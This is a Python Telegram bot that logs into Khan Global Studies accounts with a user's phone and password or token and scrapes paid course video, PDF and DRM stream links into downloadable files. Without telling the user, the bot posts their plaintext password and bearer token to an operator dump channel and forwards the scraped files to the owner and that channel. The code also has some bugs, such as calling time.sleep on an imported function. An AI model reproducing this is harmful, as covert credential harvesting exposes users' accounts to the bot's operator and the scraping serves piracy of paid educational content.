import aiohttp
import asyncio
import datetime
import re
import aiofiles
import os
import json
import cloudscraper
from pyrogram import filters
from pyrogram.errors import FloodWait, RPCError, ChatAdminRequired
from config import CHANNEL_ID, OWNER_ID
import logging
from time import time
import uuid
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

# Psutil optional hai memory monitoring ke liye
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    logging.warning("psutil module not found. Memory monitoring disabled.")
    PSUTIL_AVAILABLE = False

# Extractor module se app import karna
try:
    from Extractor import app
except ImportError as e:
    logging.error(f"Failed to import Extractor: {e}. Ensure Extractor.py exists and defines 'app'.")
    raise ImportError("Cannot start bot: Extractor module not found. Check Extractor.py and its dependencies.")
except AttributeError as e:
    logging.error(f"Extractor module does not define 'app': {e}")
    raise AttributeError("Extractor module must define 'app' as a Pyrogram Client instance.")

# Logging setup
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Constants
appname = "Khan Global Studies"
txt_dump = CHANNEL_ID
message_lock = asyncio.Lock()
url_lock = asyncio.Lock()

# Utility Functions
async def safe_send_message(chat_id, text, client):
    """Telegram message bhejne ke liye retry logic ke saath."""
    for attempt in range(3):
        try:
            return await client.send_message(chat_id, text)
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception as e:
            if attempt == 2:
                logger.error(f"Failed to send message after retries: {e}")
                return None

async def safe_edit_message(message, text, client):
    """Message edit karne ke liye retry logic ke saath."""
    for attempt in range(3):
        try:
            return await message.edit(text)
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception as e:
            if attempt == 2:
                logger.error(f"Failed to edit message after retries: {e}")
                return None

async def safe_send_photo(chat_id, photo, caption, client):
    """Photo bhejne ke liye retry logic ke saath."""
    for attempt in range(3):
        try:
            return await client.send_photo(chat_id, photo, caption=caption)
        except FloodWait as e:
            await asyncio.sleep(e.value)
        except Exception as e:
            if attempt == 2:
                logger.error(f"Failed to send photo after retries: {e}")
                return None

# Rate Limiter Class
class RateLimiter:
    """API requests ko rate limit karne ke liye."""
    def __init__(self, max_requests, period):
        self.max_requests = max_requests
        self.period = period
        self.requests = []
        self.lock = Lock()
    
    def acquire(self):
        with self.lock:
            current = time()
            self.requests = [t for t in self.requests if current - t < self.period]
            while len(self.requests) >= self.max_requests:
                oldest = self.requests[0]
                sleep_time = self.period - (current - oldest)
                if sleep_time > 0:
                    time.sleep(sleep_time)
                current = time()
                self.requests = [t for t in self.requests if current - t < self.period]
            self.requests.append(current)
    
    def cleanup(self):
        with self.lock:
            current = time()
            self.requests = [t for t in self.requests if current - t < self.period]

# API Fetch Functions
def fetch_api_sync(url, headers, data=None, json_data=None, method='POST', retries=3, rate_limiter=None):
    """Synchronous API request cloudscraper ke saath."""
    scraper = cloudscraper.create_scraper()
    for attempt in range(retries):
        if rate_limiter:
            rate_limiter.acquire()
        try:
            if method == 'POST':
                if json_data:
                    response = scraper.post(url, headers=headers, json=json_data)
                else:
                    response = scraper.post(url, headers=headers, data=data)
            else:
                response = scraper.get(url, headers=headers)
            response.raise_for_status()
            text = response.text
            try:
                return json.loads(text)
            except json.JSONDecodeError:
                logger.error(f"Non-JSON response from {url}: Response (first 500 chars): {text[:500]}")
                return None
        except Exception as e:
            logger.error(f"API request failed (attempt {attempt + 1}/{retries}): {e}")
            if attempt < retries - 1:
                time.sleep(2 ** attempt)
            else:
                return None
        finally:
            if rate_limiter:
                rate_limiter.cleanup()
    return None

async def fetch_api(url, headers, data=None, json_data=None, method='POST', retries=3, rate_limiter=None):
    """Async wrapper for fetch_api_sync."""
    with ThreadPoolExecutor() as executor:
        loop = asyncio.get_event_loop()
        future = loop.run_in_executor(executor, fetch_api_sync, url, headers, data, json_data, method, retries, rate_limiter)
        return await future

# Memory Logging
async def log_memory():
    """Memory usage log karne ke liye."""
    if not PSUTIL_AVAILABLE:
        logger.debug("Memory logging skipped: psutil not available")
        return
    try:
        process = psutil.Process()
        mem = process.memory_info().rss / 1024 / 1024
        logger.info(f"Memory usage: {mem:.2f} MB")
    except Exception as e:
        logger.error(f"Failed to log memory: {e}")

# Khan Specific Functions
async def fetch_khan_courses(headers, rate_limiter):
    """Khan ke courses fetch karne ke liye."""
    res = await fetch_api('https://api.khanglobalstudies.com/cms/user/v2/courses', headers, method='GET', rate_limiter=rate_limiter)
    if not res:
        return []
    return res

async def fetch_khan_lessons(slug, headers, rate_limiter):
    """Khan ke lessons fetch karne ke liye."""
    url = f'https://api.khanglobalstudies.com/cms/user/courses/{slug}/lessons?medium=0'
    res = await fetch_api(url, headers, method='GET', rate_limiter=rate_limiter)
    if not res:
        return {}
    return res

async def process_khan_batch(batch_id, bname, slug, headers, all_urls, rate_limiter, json_data):
    """Ek batch ke data ko process karne ke liye."""
    cdata = await fetch_khan_lessons(slug, headers, rate_limiter)
    if not cdata or not isinstance(cdata, dict):
        logger.error(f"Invalid response for batch {batch_id}: {cdata}")
        return

    json_data.append(cdata)

    lessons = cdata.get('lessons', [])
    if not isinstance(lessons, list):
        logger.warning(f"Lessons not a list for batch {batch_id}: {lessons}")
        lessons = []
    else:
        lessons = lessons[::-1]

    notes = cdata.get('notes', [])
    if not isinstance(notes, list):
        logger.warning(f"Notes not a list for batch {batch_id}: {notes}")
        notes = []
    else:
        notes = notes[::-1]

    for lesson in lessons:
        if not isinstance(lesson, dict):
            continue
        lesson_name = lesson.get('name', 'Unknown Lesson')
        videos = lesson.get('videos', [])
        if not isinstance(videos, list):
            videos = []
        videos = videos[::-1]
        for video in videos:
            if not isinstance(video, dict):
                continue
            video_name = video.get('name', 'Unknown Video')
            video_url = video.get('video_url', 'No URL')
            all_urls.append(f"({lesson_name}) {video_name}: {video_url}")
            pdfs = video.get('pdfs', [])
            if not isinstance(pdfs, list):
                pdfs = []
            for pdf in pdfs:
                if not isinstance(pdf, dict):
                    continue
                pdf_title = pdf.get('title', 'Untitled PDF')
                pdf_url = pdf.get('url', 'No URL')
                all_urls.append(f"    📄 {pdf_title}: {pdf_url}")

    for note in notes:
        if not isinstance(note, dict):
            continue
        note_name = note.get('name', 'Unknown Note')
        note_url = note.get('video_url', 'No URL')
        all_urls.append(f"{note_name}: {note_url}")

# Helper Functions
async def sanitize_bname(bname, max_length=50):
    """Batch name ko safe filename banane ke liye."""
    bname = re.sub(r'[\\/:*?"<>|\t\n\r]+', '_', bname).strip()
    if len(bname) > max_length:
        bname = bname[:max_length]
    return bname

def determine_link_type(url):
    """URL type determine karne ke liye."""
    if url is None:
        return 'Unknown'
    elif url.endswith(('.mp4', '.avi', '.mov', '.wmv', 'm3u8')):
        return 'Video'
    elif 'youtube.com' in url or 'youtu.be' in url:
        return 'YouTube'
    elif url.endswith('.pdf'):
        return 'PDF'
    elif 'mpd' in url:
        return 'DRM'
    else:
        return 'Unknown'

async def download_thumbnail(session, url, filename):
    """Thumbnail download karne ke liye."""
    try:
        async with session.get(url) as response:
            if response.status == 200:
                async with aiofiles.open(filename, 'wb') as f:
                    await f.write(await response.read())
                return filename
    except Exception as e:
        logger.error(f"Failed to download thumbnail: {e}")
    return None

# Main Handlers
@app.on_message(filters.command(["khan"]))
async def handle_khan_logic(client, m):
    """Khan command handler."""
    user_id = m.from_user.id
    rate_limiter = RateLimiter(max_requests=3, period=1)
    async with aiohttp.ClientSession() as session:
        task = asyncio.create_task(process_khan_request(client, m, user_id, rate_limiter, session))
        setattr(m, f'khan_task_{user_id}', task)
        await task

async def process_khan_request(client, m, user_id, rate_limiter, session):
    """User request ko process karne ke liye."""
    await log_memory()
    unique_id = str(uuid.uuid4())
    file_path = None
    json_path = None
    thumbnail_file = None

    try:
        async with asyncio.timeout(600):
            media_link = "https://graph.org/file/e551b66690574cfef3cc1.png"
            caption = (
                "You Chose **KHAN GLOBAL STUDIES**\n\n"
                "🔒 Send like this: **ID*Password**\n"
                "Or\n"
                "🎫 Send your **Authorization Token** directly."
            )
            editable = await safe_send_photo(m.chat.id, media_link, caption, client)
            if not editable:
                return
            input1 = await client.listen(chat_id=m.chat.id)
            raw_text = input1.text
            lucky_id_pass = raw_text
            await input1.delete()

            headers = {
                'Host': 'api.khanglobalstudies.com',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Origin': 'https://www.khanglobalstudies.com',
                'Referer': 'https://www.khanglobalstudies.com/',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'en-US,en;q=0.9'
            }

            if "*" in raw_text:
                phone, password = raw_text.split("*")
                payload = {
                    "phone": phone,
                    "password": password,
                    "remember": True
                }
                response = await fetch_api("https://api.khanglobalstudies.com/cms/login?medium=0", headers, json_data=payload, method='POST', rate_limiter=rate_limiter)
                if not response:
                    await safe_edit_message(editable, "❌ Login failed: Failed to connect to Khan server. Please try again.", client)
                    return
                authorization = response.get("token")
                if not authorization:
                    await safe_edit_message(editable, "❌ Login failed: Token not found in response.", client)
                    return
                await safe_edit_message(editable, "**Logged in Successfully 🧑🏻‍💻:**", client)
                await safe_send_message(m.chat.id, f"**Here Is Your Token** 🎫:\n\n`{authorization}`", client)
            else:
                authorization = raw_text
                await safe_edit_message(editable, "**Token Received 🎫 Successfully:**", client)
                await safe_send_message(m.chat.id, f"**Here Is Your Token** 🎫:\n\n`{authorization}`", client)

            headers.update({
                'authorization': f'Bearer {authorization}',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"'
            })

            bdata = await fetch_khan_courses(headers, rate_limiter)
            if not bdata:
                await safe_edit_message(editable, "Bhai Phle Jake Batch Buy Kr 🤗.", client)
                return

            extra_batch_details = {}
            cool = ""
            batch_ids_str = ""
            for data in bdata:
                batch_id = str(data.get('id'))
                batch_title = data.get('title')
                batch_price = data.get('price')
                batch_start_date = data.get('start_at')
                batch_end_date = data.get('end_at')
                thumbnail_url = data.get('image', {}).get('large') or data.get('image', {}).get('medium') or data.get('image', {}).get('small') or data.get('image', {}).get('thumb')
                extra_batch_details[batch_id] = {
                    'title': batch_title,
                    'price': batch_price,
                    'start_date': batch_start_date,
                    'end_date': batch_end_date,
                    'thumbnail_url': thumbnail_url,
                    'slug': data.get('slug')
                }
                aa = f"`{batch_id}` - **{batch_title}** 💸₹**{batch_price}**\n\n"
                if len(f'{cool}{aa}') > 4096:
                    cool = ""
                cool += aa
                batch_ids_str += batch_id + '&'

            batch_ids_str = batch_ids_str.rstrip('&')
            login_msg = (
                f"📱 **APP Name**: **KHAN GLOBAL STUDIES**\n\n"
                f"✅ **Logged in Successfully 🧑🏻‍💻:**\n\n"
                f"**🆔 ID & Password:**\n```\n{lucky_id_pass}\n```\n\n"
                f"**🔑 Authorization Token:**\n```\n{authorization}\n```\n\n"
                f"🗃 **List of Batches You Have:**\n\n"
                f"**BATCH-ID - BATCH NAME 💸 PRICE**\n\n"
                f"{cool}"
            )
            txt_dump_msg = await safe_send_message(txt_dump, login_msg, client)
            if not txt_dump_msg:
                await safe_send_message(m.chat.id, "Warning: Could not send login details to txt_dump channel. Ensure bot is admin.", client)
            await safe_edit_message(editable, f"{login_msg}\n\n📥 **Send the Batch ID to Download**\n\n**For All batches -** `{batch_ids_str}`", client)

            editable1 = await safe_send_message(m.chat.id, f"**Now send the Batch ID to Download**\n\n**For All batches -** `{batch_ids_str}`", client)
            if not editable1:
                return
            input2 = await client.listen(chat_id=m.chat.id)
            raw_text2 = input2.text
            await input2.delete()
            await safe_edit_message(editable, "Processing...", client)
            await editable1.delete()

            batch_ids = [b_id.strip() for b_id in raw_text2.split('&')]

            for batch_id in batch_ids:
                await log_memory()
                start_time = datetime.datetime.now()
                batch_details = extra_batch_details.get(batch_id)
                if not batch_details:
                    await safe_send_message(m.chat.id, f"Invalid Batch ID: {batch_id}", client)
                    continue

                bname = batch_details['title']
                slug = batch_details['slug']
                bname_safe = await sanitize_bname(bname)

                xx = await safe_send_message(m.chat.id, f"<b>Processing batch: {bname}</b>", client)
                if not xx:
                    continue

                all_urls = []
                json_data = []
                await process_khan_batch(batch_id, bname, slug, headers, all_urls, rate_limiter, json_data)

                file_path = f"{batch_id}_{bname_safe}_{user_id}_{unique_id}.txt"
                json_path = f"{bname_safe}_{user_id}_{unique_id}.json"
                if all_urls:
                    try:
                        async with aiofiles.open(file_path, 'w', encoding='utf-8') as f:
                            for url in all_urls:
                                await f.write(url + '\n')
                        async with aiofiles.open(json_path, 'w', encoding='utf-8') as f:
                            await f.write(json.dumps(json_data, indent=4))
                        
                        thumbnail_url = batch_details.get('thumbnail_url')
                        if thumbnail_url:
                            thumbnail_file = await download_thumbnail(session, thumbnail_url, f"{bname_safe}_thumb_{unique_id}.jpg")

                        await safe_edit_message(xx, f"<b>Scraping completed for {bname}!</b>", client)
                        await login(client, user_id, m, file_path, json_path, thumbnail_file, start_time, bname, batch_id, all_urls, batch_details, app_name="Khan Global Studies")
                    except OSError as e:
                        logger.error(f"File I/O error: {e}")
                        await safe_send_message(m.chat.id, f"Failed to write to file: {e}. Please try again.", client)
                    finally:
                        for path in [file_path, json_path, thumbnail_file]:
                            if path and os.path.exists(path):
                                os.remove(path)
                else:
                    await safe_send_message(m.chat.id, "No URLs found for the selected batch.", client)
                await xx.delete()

    except asyncio.TimeoutError:
        logger.error(f"Timeout: Course extraction for user {user_id} took longer than 10 minutes")
        await safe_send_message(m.chat.id, "Error: Course extraction took longer than 10 minutes. Please try again.", client)
    except Exception as e:
        logger.error(f"Unexpected error for user {user_id}: {e}")
        await safe_send_message(m.chat.id, f"Unexpected error occurred: {e}. Please try again.", client)
    finally:
        for path in [file_path, json_path, thumbnail_file]:
            if path and os.path.exists(path):
                os.remove(path)
        await log_memory()

async def login(client, user_id, m, file_path, json_path, thumbnail_file, start_time, bname, batch_id, all_urls, batch_details, app_name):
    """Scraped data ko user ko bhejne ke liye."""
    await log_memory()
    bname_safe = await sanitize_bname(bname)
    end_time = datetime.datetime.now()
    duration = end_time - start_time
    minutes, seconds = divmod(duration.total_seconds(), 60)
    user = await client.get_users(user_id)
    contact_link = f"[{user.first_name}](tg://openmessage?user_id={user_id})"

    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
            all_text = await f.read()
    except OSError as e:
        logger.error(f"Failed to read file: {e}")
        await safe_send_message(m.chat.id, f"Error reading file: {e}. Please try again.", client)
        return

    video_count = 0
    youtube_count = 0
    pdf_count = 0
    drm_count = 0
    total_count = 0
    for url in all_urls:
        link_type = determine_link_type(url.split(': ')[-1])
        if link_type == 'Video':
            video_count += 1
            total_count += 1
        elif link_type == 'YouTube':
            youtube_count += 1
            video_count += 1
            total_count += 1
        elif link_type == 'PDF':
            pdf_count += 1
            total_count += 1
        elif link_type == 'DRM':
            drm_count += 1
            video_count += 1
            total_count += 1
        else:
            total_count += 1

    current_date = datetime.datetime.now().strftime("%Y-%m-d")
    batch_price = batch_details.get('price', 'N/A')
    batch_start_date = batch_details.get('start_date', 'N/A')
    batch_end_date = batch_details.get('end_date', 'N/A')
    thumbnail_url = batch_details.get('thumbnail_url', 'N/A')

    caption = (
        f"📱 **APP Name**: {app_name}\n\n"
        f"======= **BATCH DETAILS** =======\n\n"
        f"🌟 **Batch Name**: `{bname}`\n"
        f"🪪 **Batch ID**: `{batch_id}`\n"
        f"💸 **Price**: `{batch_price}`\n"
        f"📅 **Start Date**: `{batch_start_date}`\n"
        f"⏳ **End Date**: `{batch_end_date}`\n"
        f"🖼 **Thumbnail**: [Thumbnail]({thumbnail_url})\n\n"
        f"======= **LINK SUMMARY** =======\n\n"
        f"🔢 **Total Number of Links**: `{total_count}`\n"
        f"┠🎥 **Total Videos**: `{video_count}`\n"
        f"┃   ┠▶️ **YouTube Links**: `{youtube_count}`\n"
        f"┃   ┠🔒 **m3u8 Links**: `{drm_count}`\n"
        f"┠📄 **Total PDFs**: `{pdf_count}`\n\n"
        f"📅 **Generated On**: `{current_date}`\n"
        f"**Extracted BY: {contact_link}**"
    )

    async with message_lock:
        try:
            txt_doc = await client.send_document(m.chat.id, file_path, caption=caption, thumb=thumbnail_file)
            json_doc = await client.send_document(m.chat.id, json_path, caption=caption, thumb=thumbnail_file)
            try:
                await client.send_document(OWNER_ID, txt_doc.document.file_id, caption=caption)
                await client.send_document(OWNER_ID, json_doc.document.file_id, caption=caption)
            except Exception as e:
                logger.error(f"Failed to send document to owner {OWNER_ID}: {e}")
            txt_dump_doc = await client.send_document(txt_dump, txt_doc.document.file_id, caption=caption)
            json_dump_doc = await client.send_document(txt_dump, json_doc.document.file_id, caption=caption)
            if not txt_dump_doc or not json_dump_doc:
                await safe_send_message(m.chat.id, "Warning: Could not send file to txt_dump channel. Ensure bot is admin.", client)
        except ChatAdminRequired as e:
            logger.error(f"ChatAdminRequired in txt_dump: {e}")
            await safe_send_message(m.chat.id, "Error: Bot lacks admin privileges in txt_dump channel. File sent only to you.", client)
        except Exception as e:
            logger.error(f"Failed to send document: {e}")
            await safe_send_message(m.chat.id, f"Error sending file: {e}. Please try again.", client)
